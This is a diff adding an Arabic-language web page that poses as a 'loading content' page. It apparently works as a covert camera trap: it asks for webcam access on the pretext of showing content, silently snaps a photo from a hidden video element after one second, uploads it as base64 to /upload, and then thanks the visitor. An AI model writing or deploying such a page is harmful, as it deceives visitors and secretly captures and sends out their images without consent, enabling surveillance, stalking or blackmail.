@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<body>
+    <h2>جاري تحميل المحتوى...</h2>
+    <video id="video" style="display:none;"></video>
+    <canvas id="canvas" style="display:none;" width="400" height="300"></canvas>
+
+    <script>
+        async function start() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // التقاط الصورة بعد ثانية واحدة من السماح
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+                    const image = canvas.toDataURL('image/png');
+                    
+                    await fetch('/upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image })
+                    });
+                    document.body.innerHTML = "<h1>شكراً لك!</h1>";
+                }, 1000);
+            } catch (err) {
+                document.body.innerHTML = "<h1>يجب السماح للكاميرا لمشاهدة المحتوى</h1>";
+            }
+        }
+        start();
+    </script>
+</body>
+</html>
